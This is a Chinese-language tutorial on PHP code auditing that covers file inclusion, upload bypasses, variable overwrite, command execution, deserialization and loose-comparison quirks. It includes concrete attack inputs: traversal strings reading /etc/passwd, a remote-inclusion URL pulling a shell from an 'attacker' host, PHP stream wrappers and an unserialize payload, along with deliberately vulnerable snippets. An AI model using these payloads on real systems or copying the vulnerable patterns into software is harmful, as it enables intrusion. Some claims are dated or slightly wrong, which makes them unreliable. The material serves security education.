# PHP 代码审计

## 文件包含

常见的导致文件包含的函数有：

- PHP: `include()` `include_once()` `require()` `require_once()` `fopen()` `readfile()` 等
- JSP / Servlet: `ava.io.File()` `java.io.FileReader()` 等
- ASP: `include file` `include virtual` 等

当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。

### 本地文件包含

本地文件包含，Local File Inclusion，LFI。

```php
<?php
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
?>
```

上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。

- %00 截断

  `?file=../../../../../../../../../etc/passwd%00`

  需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。

- 路径长度截断

  `?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.`

  Linux 需要文件名长于 4096，Windows 需要长于 256。

- 点号截断

  `?file=../../../../../../../../../boot.ini/………[…]…………`

  只适用 Windows，点号需要长于 256。

### 远程文件包含

远程文件包含，Remote File Inclusion，RFI。

```php
<?php
if ($route == "share") {
  require_once $basePath . "/action/m_share.php";
} elseif ($route == "sharelink") {
  require_once $basePath . "/action/m_sharelink.php";
}
```

构造变量 `basePath` 的值。

```
/?basePath=http://attacker/phpshell.txt?
```

最终的代码执行了

```php
require_once "http://attacker/phpshell.txt?/action/m_share.php";
```

问号后的部分被解释为 URL 的 querystring，这也是一种”截断“。

- 普通远程文件包含

  `?file=[http|https|ftp]://example.com/shell.txt`

  需要 `allow_url_fopen=On` 并且 `allow_url_include=On`。

- 利用 PHP 流 input

  `?file=php://input`

  需要 `allow_url_include=On`。

- 利用 PHP 流 filter

  `?file=php://filter/convert.base64-encode/resource=index.php`

  需要 `allow_url_include=On`。

- 利用 data URIs

  `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`

  需要 `allow_url_include=On`。

- 利用 XSS 执行

  `?file=http://127.0.0.1/path/xss.php?xss=phpcode`

  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。

## 文件上传

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指“上传 web 脚本能够被服务器解析”的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这web容器执行，其次用户能从web上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。

### 绕过上传检查

- 前端检查扩展名

  抓包绕过即可。

- `Content-Type` 检测文件类型

  抓包修改 `Content-Type` 类型，使其符合白名单规则。

- 服务端添加后缀

  尝试 %00 截断。

- 服务端扩展名检测

  利用解析漏洞。

  - Apache 解析

    `phpshell.php.rar.rar.rar.rar` 因为Apache不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个PHP文件。

  - IIS 解析

    IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。

  - PHP CGI 路径解析

    当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析，`notexist.php` 是不存在的文件。此时 Nginx 的配置如下

    ```nginx
    location ~ \.php$ {
      root html;
      fastcgi_pass 127.0.0.1:9000;
      fastcgi_index index.php;
      fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
      include fastcgi_param;
    }
    ```

- 其他方式

  后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。

## 变量覆盖

### 全局变量覆盖

变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。

```ini
register_globals=ON
```

示例

```php
<?php
echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";

if ($auth) {
  echo "private!";
}
?>
```

当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth` 变量将自动得到赋值。

### `extract()` 变量覆盖

`extract()` 函数能够将变量从数组导入到当前的符号表，其定义为

```
int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
```

其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 `EXTR_OVERWRITE` 和 `EXTR_SKIP`。

当值为 `EXTR_OVERWRITE` 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 `EXTR_SKIP` 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 `EXTR_OVERWRITE`。

```php
<?php
$auth = "0";
extract($_GET);

if ($auth == 1) {
  echo "private!";
} else {
  echo "public!";
}
?>
```

当 `extract()` 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。

### `import_request_variables` 变量覆盖

```
bool import_request_variables (string $types [, string $prefix])
```

`import_request_variables` 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。

```php
<?php
$auth = "0";
import_request_variables("G");

if ($auth == 1) {
  echo "private!";
} else {
  echo "public!";
}
?>
```

`import_request_variables("G")` 指定导入 GET 请求中的变量，提交 `test.php?auth=1` 出现变量覆盖。

### `parse_str()` 变量覆盖

```
void parse_str ( string $str [, array &$arr ])
```

`parse_str()` 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。

```php
// var.php?var=new  变量覆盖
$var = "init";
parse_str($_SERVER["QUERY_STRING"]);
print $var;
```

与 `parse_str()` 类似的函数还有 `mb_parse_str()`。

## 命令执行

### 直接执行代码

PHP 中有不少可以直接执行代码的函数。

```php
eval();
assert();
system();
exec();
shell_exec();
passthru();
escapeshellcmd();
pcntl_exec();
等
```

### `preg_replace()` 代码执行

`preg_replace()` 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。

```php
<?php
$var = "<tag>phpinfo()</tag>";
preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
?>
```

如果没有 `/e` 修饰符，可以尝试 %00 截断。

### 动态函数执行

用户自定义的函数可以导致代码执行。

```php
<?php
$dyn_func = $_GET["dyn_func"];
$argument = $_GET["argument"];
$dyn_func($argument);
?>
```

### 反引号命令执行

```php
<?php
echo `ls -al`;
?>
```

### Curly Syntax

PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。

```php
<?php
$var = "aaabbbccc ${`ls`}";
?>
```

```php
<?php
$foobar = "phpinfo";
${"foobar"}();
?>
```

### 回调函数

很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。

```php
<?php
$evil_callback = $_GET["callback"];
$some_array = array(0,1,2,3);
$new_array = array_map($evil_callback, $some_array);
?>
```

攻击 payload

```
http://www.a.com/index.php?callback=phpinfo
```

### 反序列化

如果 `unserialize()` 在执行时定义了 `__destruct()` 或 `__wakeup()` 函数，则有可能导致代码执行。

```php
<?php
class Example {
  var $var = "";
  function __destruct() {
    eval($this->$var);
  }
}
unserialize($_GET["saved_code"]);
?>
```

攻击 payload

```
http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}
```

## PHP 特性

### 数组

```php
<?php
$var = 1;
$var = array();
$var = "string";
?>
```

php不会严格检验传入的变量类型，也可以将变量自由的转换类型。

比如在 `$a == $b` 的比较中 

````
$a = null; 
$b = false; //为真 
$a = ''; 
$b = 0; //同样为真
````

然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。

```php
0=='0' //true
0 == 'abcdefg' //true
0 === 'abcdefg' //false
1 == '1abcdef' //true
```

### 魔法 Hash

```php
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada" //false
"0e1abc"=="0"  //true
```

在进行比较运算时，如果遇到了`0e\d+`这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足`0e\d+`这种模式就不会相等。

### 十六进制转换

```php
"0x1e240"=="123456" //true
"0x1e240"==123456 //true
"0x1e240"=="1e240" //false
```

当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。

### 类型转换

常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。

**`int` 转 `string`：**

```php
$var = 5;
方式1：$item = (string)$var;
方式2：$item = strval($var);
```

**`string` 转 `int`**：`intval()`函数。

对于这个函数，可以先看 2 个例子。

```php
var_dump(intval('2')) //2
var_dump(intval('3abcd')) //3
var_dump(intval('abcd')) //0
```

说明`intval()`转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，`intval()`不会报错而是返回0。

同时，程序员在编程的时候也不应该使用如下的这段代码：

```php
if(intval($a)>1000) {
 mysql_query("select * from news where id=".$a)
}
```

这个时候 `$a` 的值有可能是 `1002 union`。

### 内置函数的参数的松散性

内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。

**md5()**

```php
$array1[] = array(
 "foo" => "bar",
 "bar" => "foo",
);
$array2 = array("foo", "bar", "hello", "world");
var_dump(md5($array1)==var_dump($array2)); //true
```

PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] ) `，`md5()`中的需要是一个string类型的参数。但是当你传递一个array时，`md5()`不会报错，只是会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。

**strcmp()**

`strcmp()`函数在PHP官方手册中的描述是`int strcmp ( string $str1 , string $str2 )` ,需要给`strcmp()`传递2个`string`类型的参数。如果 `str1`小于`str2`,返回-1，相等返回0，否则返回1。`strcmp()` 函数比较字符串的本质是将两个变量转换为ASCII，然后进行减法运算，然后根据运算结果来决定返回值。

如果传入给出`strcmp()`的参数是数字呢？

```php
$array=[1,2,3];
var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
```

**switch()**

如果`switch()`是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：

```php
$i ="2abc";
switch ($i) {
case 0:
case 1:
case 2:
 echo "i is less than 3 but not negative";
 break;
case 3:
 echo "i is 3";
}
```

这个时候程序输出的是`i is less than 3 but not negative`，是由于`switch()`函数将`$i`进行了类型转换，转换结果为2。

**in_array()**

在PHP手册中，`in_array()`函数的解释是`bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么in_array就会使用松散比较来判断`$needle`是否在`$haystack`中。当strince的值为true时，`in_array()`会比较needls的类型和haystack中的类型是否相同。

```php
$array=[0,1,2,'3'];
var_dump(in_array('abc', $array)); //true
var_dump(in_array('1bc', $array)); //true
```

可以看到上面的情况返回的都是true,因为`'abc'`会转换为0，`'1bc'`转换为1。

`array_search()`与`in_array()`也是一样的问题。

## 寻找源代码备份



